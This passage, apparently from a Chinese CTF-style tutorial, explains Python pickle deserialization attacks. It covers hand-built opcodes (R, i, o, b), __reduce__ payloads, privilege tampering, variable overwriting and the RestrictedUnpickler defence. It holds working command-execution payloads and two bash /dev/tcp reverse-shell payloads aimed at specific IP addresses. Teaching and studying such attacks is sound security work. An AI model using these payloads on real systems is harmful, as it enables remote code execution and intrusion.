可以看下python的魔术方法</p><p>和php类似,python魔术方法也会在一些特定情况下被自动调用.我们尤其要注意的是<code>__reduce__</code>魔术方法,这会在反序列化过程开始时被调用,所以我们可以序列化一个<code>__reduce__</code>魔术方法中有系统命令的实例并且让服务器将它反序列化,从而达到任意命令执行的效果.</p><p>除此之外还有很多魔术方法.例如初始化函数<code>__init__</code>和构造函数<code>__new__</code>.和php类似,python中也有魔法属性.例如<code>__doc__</code>,<code>__name__</code>,<code>__class__</code>,<code>__base__</code>等.</p><p><code>pickle.loads()</code>会在反序列化一个实例时自动引入没有引入的库.</p><blockquote><p><strong>构造方法<code>__new__</code></strong></p><ul><li>在实例化一个类时自动被调用,是类的构造方法.</li><li>可以通过重写<code>__new__</code>自定义类的实例化过程</li></ul><p><strong>初始化方法<code>__init__</code></strong></p><ul><li>在<code>__new__</code>方法之后被调用,主要负责定义类的属性,以初始化实例</li></ul><p>析构方法<code>__del__</code></p><ul><li>在实例将被销毁时调用</li><li>只在实例的所有调用结束后才会被调用</li></ul><p><code>__getattr__</code></p><ul><li>获取不存在的对象属性时被触发</li><li>存在返回值</li></ul><p><code>__setattr__</code></p><ul><li>设置对象成员值的时候触发</li><li>传入一个self,一个要设置的属性名称,一个属性的值</li></ul><p><code>__repr__</code></p><ul><li>在实例被传入<code>repr()</code>时被调用</li><li>必须返回字符串</li></ul><p><code>__call__</code></p><ul><li>把对象当作函数调用时触发</li></ul><p><code>__len__</code></p><ul><li>被传入<code>len()</code>时调用</li><li>返回一个整型</li></ul><p><code>__str__</code></p><ul><li>被<code>str()</code>,<code>format()</code>,<code>print()</code>调用时调用,返回一个字符串</li></ul></blockquote><p>在未增加<code>__reduce__</code>时，我们的序列化内容是一串基于上面提到的操作码的 bytes，我们可以利用 pickletools 将这里的 opcode 转化成我们更易读的形式</p><p><strong>pickletools是python的一个内建模块,常用的方法有<code>pickletools.dis()</code>,用于把一段opcode转换为易读的形式,</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> opcode</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;\x80\x03c__main__\nPerson\nq\x00)\x81q\x01&#125;q\x02(X\x03\x00\x00\x00ageq\x03K\x12X\x04\x00\x00\x00nameq\x04X\x06\x00\x00\x00Pickleq\x05ub.&#x27;</span></span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0: \x80 PROTO      3</span></span><br><span class="line"><span class="string">    2: c    GLOBAL     &#x27;__main__ Person&#x27;</span></span><br><span class="line"><span class="string">   19: q    BINPUT     0</span></span><br><span class="line"><span class="string">   21: )    EMPTY_TUPLE</span></span><br><span class="line"><span class="string">   22: \x81 NEWOBJ</span></span><br><span class="line"><span class="string">   23: q    BINPUT     1</span></span><br><span class="line"><span class="string">   25: &#125;    EMPTY_DICT</span></span><br><span class="line"><span class="string">   26: q    BINPUT     2</span></span><br><span class="line"><span class="string">   28: (    MARK</span></span><br><span class="line"><span class="string">   29: X        BINUNICODE &#x27;age&#x27;</span></span><br><span class="line"><span class="string">   37: q        BINPUT     3</span></span><br><span class="line"><span class="string">   39: K        BININT1    18</span></span><br><span class="line"><span class="string">   41: X        BINUNICODE &#x27;name&#x27;</span></span><br><span class="line"><span class="string">   50: q        BINPUT     4</span></span><br><span class="line"><span class="string">   52: X        BINUNICODE &#x27;Pickle&#x27;</span></span><br><span class="line"><span class="string">   63: q        BINPUT     5</span></span><br><span class="line"><span class="string">   65: u        SETITEMS   (MARK at 28)</span></span><br><span class="line"><span class="string">   66: b    BUILD</span></span><br><span class="line"><span class="string">   67: .    STOP</span></span><br><span class="line"><span class="string">highest protocol among opcodes = 2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Pker"><a href="#Pker" class="headerlink" title="Pker"></a>Pker</h3><p>这是一个可以遍历Python AST的形式 来自动化解析 pickle opcode的工具</p><p><a href="https://github.com/EddieIvan01/pker">https://github.com/EddieIvan01/pker</a> 也可以使用这个工具来生成，在后续部分操作码被限制的时候某些情况下还是很好用的</p><h4 id="Pker可以做到什么"><a href="#Pker可以做到什么" class="headerlink" title="Pker可以做到什么"></a>Pker可以做到什么</h4><ul><li>变量赋值：存到memo中，保存memo下标和变量名即可</li><li>函数调用</li><li>类型字面量构造</li><li>list和dict成员修改</li><li>对象成员变量修改</li></ul><h4 id="使用方法与实例"><a href="#使用方法与实例" class="headerlink" title="使用方法与实例"></a>使用方法与实例</h4><p>pker最主要的有三个函数<code>GLOBAL()</code>、<code>INST()</code>和<code>OBJ()</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)             =&gt;  cos\nsystem\n</span><br><span class="line">INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;ls&#x27;)         =&gt;  (S&#x27;ls&#x27;\nios\nsystem\n</span><br><span class="line">OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;ls&#x27;)  =&gt;  (cos\nsystem\nS&#x27;ls&#x27;\no</span><br></pre></td></tr></table></figure><p>return可以返回一个对象</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return           =&gt;  .</span><br><span class="line">return var       =&gt;  g_\n.</span><br><span class="line">return 1         =&gt;  I1\n.</span><br></pre></td></tr></table></figure><p>当然你也可以和Python的正常语法结合起来，下面是使用示例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pker_test.py</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">s = &#x27;id&#x27;</span><br><span class="line">lst = [i]</span><br><span class="line">tpl = (0,)</span><br><span class="line">dct = &#123;tpl: 0&#125;</span><br><span class="line">system = GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)</span><br><span class="line">system(s)</span><br><span class="line">return</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令行下</span><br><span class="line">$ python3 pker.py &lt; pker_tests.py</span><br><span class="line"></span><br><span class="line">b&quot;I0\np0\n0S&#x27;id&#x27;\np1\n0(g0\nlp2\n0(I0\ntp3\n0(g3\nI0\ndp4\n0cos\nsystem\np5\n0g5\n(g1\ntR.&quot;</span><br></pre></td></tr></table></figure><p>自动解析并生成了我们所需的opcode。</p><h2 id="手搓opcode"><a href="#手搓opcode" class="headerlink" title="手搓opcode"></a>手搓opcode</h2><p>我们可以通过在类中重写<code>__reduce__</code>方法，从而在反序列化时执行任意命令，但是通过这种方法一次只能执行一个命令，如果想一次执行多个命令，就只能通过手写opcode的方式了</p><p>在opcode中，<code>.</code>是程序结束的标志。我们可以通过去掉<code>.</code>来将两个字节流拼接起来</p><p>在pickle中，函数执行的字节码主要有有三个：<code>R</code>、<code>i</code>、<code>o</code>，所以我们可以从三个方向构造paylaod</p><p>另外还有b操作符 也是可以构造paylaod</p><p><img src="C:\Users\admin\Desktop\20200320230711-7972c0ea-6abc-1.gif" alt="20200320230711-7972c0ea-6abc-1"></p><h3 id="R操作符"><a href="#R操作符" class="headerlink" title="R操作符"></a>R操作符</h3><p>对应函数如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def load_reduce(self):</span><br><span class="line">        stack = self.stack</span><br><span class="line">        args = stack.pop()</span><br><span class="line">        func = stack[-1]</span><br><span class="line">        stack[-1] = func(*args)</span><br></pre></td></tr></table></figure><p>弹出栈作为函数执行的参数 参数需要是元组形式 随后取栈中最后一个元素作为函数 将指向结果赋值给此元素</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode1=b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cos\nsystem\n</span><br></pre></td></tr></table></figure><h3 id="i操作符"><a href="#i操作符" class="headerlink" title="i操作符"></a>i操作符</h3><p>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p><p><img src="https://bu.dusays.com/2024/05/13/6641a59872990.png" alt="image-20240319223011879"></p><p>读取下面两行分别为module和name 然后 利用 find_class 寻找对应的方法 pop_mark 获取参数</p><p>i操作符将寻找前面的mark来闭合 中间的数据作为元组 将其作为函数参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(X\x06\x00\x00\x00whoamiios\nsystem\n.</span><br></pre></td></tr></table></figure><p>X向后读取四个字符串 将我们的whoami命令压入栈中 i将向后读取 模块与方法os.system 将前面的参数执行</p><p><img src="https://bu.dusays.com/2024/05/13/6641a597c125f.png" alt="image-20240319223116907"></p><p>pop_mark的代码如下</p><p>先将当前栈赋值给items 然后弹出栈内元素 随后 将这个栈赋值给当前栈 返回items</p><p><img src="https://bu.dusays.com/2024/05/13/6641a597d892a.png" alt="image-20240319223058153"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode2=b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="o操作符"><a href="#o操作符" class="headerlink" title="o操作符"></a>o操作符</h3><p>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象</p><p><img src="https://bu.dusays.com/2024/05/13/6641a597d609e.png" alt="image-20240319223201321"></p><p>pop_mark我们上面看到了 就是可以弹出栈内的元素 这里的args就是 先弹出栈中的一个元素作为参数 然后 再弹出第一个元素作为函数</p><p>最后 使用instantiate函数进行自执行</p><p>可以如下构造</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&quot;(cos\nsystem\nX\x06\x00\x00\x00whoamio.&quot;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a5986d936.png" alt="image-20240319223219061"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode3=b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="b操作符"><a href="#b操作符" class="headerlink" title="b操作符"></a>b操作符</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a59891c2f.png" alt="image-20240319223240426"></p><p>当栈中存在<code>__setstate__</code>时 会执行setstate(state) 也就是 这里我们如果自己写一个<code>__setstate__</code>类 构造os.system 和 whoami即可执行命令</p><p>s字符的源码 是将</p><p><img src="https://bu.dusays.com/2024/05/13/6641a597d904c.png" alt="image-20240319223258882"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c__main__\ntest\n)\x81&#125;X\x0c\x00\x00\x00__setstate__cos\nsystem\nsbX\x06\x00\x00\x00whoamib.</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a598cb11a.png" alt="image-20240319223319867"></p><p>首先 搞了主函数和类 <code>__main__</code>和test 随后 插入空元组和空字典 然后写入<code>__setstate__</code> c再向后读 得到os.system 字符s将第一个元素和第二个元素作为键值对 插入到第三个元素之中<code>&#123;__main__.test:()&#125;,__setstate__,os.system</code> b字符使第一个元素出栈 也就是<code>&#123;&#39;__setstate__&#39;:os.system&#125;</code> 执行一次 setstate(state) 随后插入whoami然后弹出 执行os.system(whoami)</p><p>‍</p><p>并且<code>pickle.loads</code>会解决import 问题，对于未引入的module会自动尝试import。也就是说整个python标准库的代码执行、命令执行函数我们都可以使用。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>可以使用<code>R</code>,<code>i</code>,<code>o</code>,<code>b</code>等操作码实现命令执行</p><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>基本的构造如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&lt;module&gt;</span><br><span class="line">&lt;callable&gt;</span><br><span class="line">(&lt;args&gt;</span><br><span class="line">tR</span><br></pre></td></tr></table></figure><p>填充上内容也就是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cos</span><br><span class="line">system   #引入 os 模块的 system 方法，这里实际上是一步将函数添加到 stack 的操作</span><br><span class="line">(S&#x27;ls&#x27;   # 把当前 stack 存到 metastack，清空 stack，再将 &#x27;ls&#x27; 压入 stack</span><br><span class="line">tR.     # t 也就是将 stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将         tuple 压入 stack</span><br><span class="line">        # R 的内容就成为了 system(*(&#x27;ls&#x27;,)) ，然后 . 代表结束，返回当前栈顶元素</span><br><span class="line">&lt;=&gt; __import__(&#x27;os&#x27;).system(*(&#x27;ls&#x27;,))</span><br></pre></td></tr></table></figure><p>这样就是一个最基础的 getshell 的构造</p><p>其中 c 操作码指向的实际上是一个 <code>self.find_class(modname, name);</code> 可以在源码中找到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Subclasses may override this.</span></span><br><span class="line">        <span class="keyword">if</span> self.proto &lt; <span class="number">3</span> <span class="keyword">and</span> self.fix_imports:</span><br><span class="line">            <span class="keyword">if</span> (module, name) <span class="keyword">in</span> _compat_pickle.NAME_MAPPING:</span><br><span class="line">                module, name = _compat_pickle.NAME_MAPPING[(module, name)]</span><br><span class="line">            <span class="keyword">elif</span> module <span class="keyword">in</span> _compat_pickle.IMPORT_MAPPING:</span><br><span class="line">                module = _compat_pickle.IMPORT_MAPPING[module]</span><br><span class="line">        <span class="built_in">__import__</span>(module, level=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> self.proto &gt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> _getattribute(sys.modules[module], name)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br></pre></td></tr></table></figure><p><code>c</code>操作符把<code>find_class()</code>函数返回的一个类对象压入栈,通过<code>__import__()</code>引入了模块并且通过<code>self.proto</code>判断pickle版本处理了不同版本的函数名称问题.</p><p>使用其他操作符同理</p><p>i:  opcode&#x3D;b’’’(S’calc’ ios system .’’’</p><p>o:  opcode&#x3D;b’’’(cos system S’calc’ o.’’’</p><p><strong>注：<code>pickle.loads</code> 是可以自动 import 的，这一点为我们的攻击提供了方便</strong></p><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>我们还可以重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行，对应opcode当中的R指令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Test(), protocol=<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;cnt\nsystem\np0\n(Vcalc\np1\ntp2\nRp3\n.&#x27;</span></span><br></pre></td></tr></table></figure><p>利用 pickle 的 <code>__reduce__</code> 可以直接用它的操作模式实现我们上面手搓的 <code>__import__(&#39;os&#39;).system(*(&#39;ls&#39;,))</code> 的构造。（ 缺点：只能执行单一的函数，很难构造复杂的操作 ）</p><h4 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h4><p>上文也是提到过</p><p>opcode 都会以 <code>.</code> 结束，我们在程序正常的 opcode 之后去掉 <code>.</code> 再拼接上我们的内容即可命令执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tRcos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h4 id="法四"><a href="#法四" class="headerlink" title="法四"></a>法四</h4><p>配合反弹shell</p><p>payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.11.21/8888 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"><span class="string">tR.</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=<span class="string">&#x27;&#x27;&#x27;V__setstate__</span></span><br><span class="line"><span class="string">(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/124.223.91.44/2333 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a.encode()))</span><br></pre></td></tr></table></figure><h3 id="操控实例化对象的属性"><a href="#操控实例化对象的属性" class="headerlink" title="操控实例化对象的属性"></a>操控实例化对象的属性</h3><h4 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,age,name</span>):</span><br><span class="line">        self.age=age</span><br><span class="line">        self.name=name</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">Person</span></span><br><span class="line"><span class="string">(I18</span></span><br><span class="line"><span class="string">S&#x27;Pickle&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(p.age,p.name)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">&lt;__main__.Person <span class="built_in">object</span> at <span class="number">0x00000223B2E14CD0</span>&gt;//地址，会根据您运行代码的机器和 Python 解释器的不同而不同</span><br><span class="line"><span class="number">18</span> Pickle</span><br></pre></td></tr></table></figure><p>以上opcode相当于手动执行了构造函数<code>Person(18,&#39;Pickle&#39;)</code>,改变了实例化的属性</p><h4 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h4><p>假设有如下内容限制用户权限：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,admin,guest</span>):</span><br><span class="line">        self.admin=admin</span><br><span class="line">        self.guest=guest</span><br></pre></td></tr></table></figure><p>假设正常我们以访客登录时会传入如下 pickle 序列化内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.admin=<span class="literal">False</span></span><br><span class="line">        self.guest=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">u = User()</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(u))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;\x80\x03c__main__\nUser\nq\x00)\x81q\x01&#125;q\x02(X\x05\x00\x00\x00adminq\x03\x89X\x05\x00\x00\x00guestq\x04\x88ub.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0: \x80 PROTO      3</span></span><br><span class="line"><span class="string">    2: c    GLOBAL     &#x27;__main__ User&#x27;</span></span><br><span class="line"><span class="string">   17: q    BINPUT     0</span></span><br><span class="line"><span class="string">   19: )    EMPTY_TUPLE</span></span><br><span class="line"><span class="string">   20: \x81 NEWOBJ</span></span><br><span class="line"><span class="string">   21: q    BINPUT     1</span></span><br><span class="line"><span class="string">   23: &#125;    EMPTY_DICT</span></span><br><span class="line"><span class="string">   24: q    BINPUT     2</span></span><br><span class="line"><span class="string">   26: (    MARK</span></span><br><span class="line"><span class="string">   27: X        BINUNICODE &#x27;admin&#x27;</span></span><br><span class="line"><span class="string">   37: q        BINPUT     3</span></span><br><span class="line"><span class="string">   39: \x89     NEWFALSE</span></span><br><span class="line"><span class="string">   40: X        BINUNICODE &#x27;guest&#x27;</span></span><br><span class="line"><span class="string">   50: q        BINPUT     4</span></span><br><span class="line"><span class="string">   52: \x88     NEWTRUE</span></span><br><span class="line"><span class="string">   53: u        SETITEMS   (MARK at 26)</span></span><br><span class="line"><span class="string">   54: b    BUILD</span></span><br><span class="line"><span class="string">   55: .    STOP</span></span><br><span class="line"><span class="string">highest protocol among opcodes = 2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>那么我们对登陆时的 <code>\x89</code> <code>\x88</code> 进行调换，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nUser\nq\x00)\x81q\x01&#125;q\x02(X\x05\x00\x00\x00adminq\x03\x89X\x05\x00\x00\x00guestq\x04\x88ub.&#x27;</span><br><span class="line"></span><br><span class="line">b&#x27;\x80\x03c__main__\nUser\nq\x00)\x81q\x01&#125;q\x02(X\x05\x00\x00\x00adminq\x03\x88X\x05\x00\x00\x00guestq\x04\x89ub.&#x27;</span><br></pre></td></tr></table></figure><p>即可得到如下实例化结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> opcode</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,admin,guest</span>):</span><br><span class="line">        self.admin=admin</span><br><span class="line">        self.guest=guest</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;\x80\x03c__main__\nUser\nq\x00)\x81q\x01&#125;q\x02(X\x05\x00\x00\x00adminq\x03\x88X\x05\x00\x00\x00guestq\x04\x89ub.&#x27;</span></span><br><span class="line"><span class="comment">#pickletools.dis(opcode)</span></span><br><span class="line"></span><br><span class="line">fakeUser = pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(fakeUser.admin,fakeUser.guest)</span><br><span class="line"></span><br><span class="line"><span class="comment"># True False</span></span><br></pre></td></tr></table></figure><p>可见将admin与guest的权限改了</p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>在session或token中，由于需要存储一些用户信息，所以我们常常能够看见pickle的身影。程序会将用户的各种信息序列化并存储在session或token中，以此来验证用户的身份。</p><p>假如session或token是以明文的方式进行存储的，我们就有可能通过变量覆盖的方式进行身份伪造。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#secret.py</span></span><br><span class="line">secret=<span class="string">&quot;This is a key&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secret变量的值为:&quot;</span>+secret.secret)</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;secret&#x27;</span></span><br><span class="line"><span class="string">S&#x27;Hack!!!&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line">fake=pickle.loads(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secret变量的值为:&quot;</span>+fake.secret)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">secret变量的值为:This <span class="keyword">is</span> a key</span><br><span class="line">secret变量的值为:Hack!!!</span><br></pre></td></tr></table></figure><p>我们首先通过<code>c</code>来获取<code>__main__.secret</code>模块，然后将字符串<code>secret</code>和<code>Hack!!!</code>压入栈中，然后通过字节码<code>d</code>将两个字符串组合成字典<code>&#123;&#39;secret&#39;:&#39;Hack!!!&#39;&#125;</code>的形式。由于在pickle中，反序列化后的数据会以key-value的形式存储，所以secret模块中的变量<code>secret=&quot;This is a key&quot;</code>，是以<code>&#123;&#39;secret&#39;:&#39;This is a key&#39;&#125;</code>形式存储的。最后再通过字节码b来执行<code>__dict__.update()</code>，即<code>&#123;&#39;secret&#39;:&#39;This is a key&#39;&#125;.update(&#123;&#39;secret&#39;:&#39;Hack!!!&#39;&#125;)</code>，因此最终secret变量的值被覆盖成了<code>Hack!!!</code>。</p><h2 id="官方对此漏洞的修复"><a href="#官方对此漏洞的修复" class="headerlink" title="官方对此漏洞的修复"></a>官方对此漏洞的修复</h2><p>对于pickle反序列化漏洞，官方的第一个建议就是永远不要unpickle来自于不受信任的或者未经验证的来源的数据。第二个就是通过重写<code>Unpickler.find_class()</code>来限制全局变量，我们来看官方的例子</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">safe_builtins = &#123;</span><br><span class="line">    <span class="string">&#x27;range&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;complex&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;set&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;frozenset&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;slice&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#重写了find_class方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&quot;cos\nsystem\n(S&#x27;echo hello world&#x27;\ntR.&quot;</span></span><br><span class="line">restricted_loads(opcode)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">###结果如下</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">_pickle.UnpicklingError: <span class="keyword">global</span> <span class="string">&#x27;os.system&#x27;</span> <span class="keyword">is</span> forbidden</span><br></pre></td></tr></table></figure><p>以上例子通过重写<code>Unpickler.find_class()</code>方法，限制调用模块只能为<code>builtins</code>，且函数必须在白名单内，否则抛出异常。这种方式限制了调用的模块函数都在白名单之内，这就保证了Python在<code>unpickle</code>时的安全性。</p><p>不过，假如<code>Unpickler.find_class()</code>中对于模块和函数的限制不是那么严格的话，我们仍然有可能绕过其限制。</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="绕过find-class"><a href="#绕过find-class" class="headerlink" title="绕过find_class"></a>绕过find_class</h3><p>想要绕过<code>find_class</code>，我们则需要了解其何时被调用。在官方文档中描述如下</p><blockquote><p><em>出于这样的理由，你可能会希望通过定制</em> <a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle.Unpickler.find_class"><code>Unpickler.find_class()</code></a> 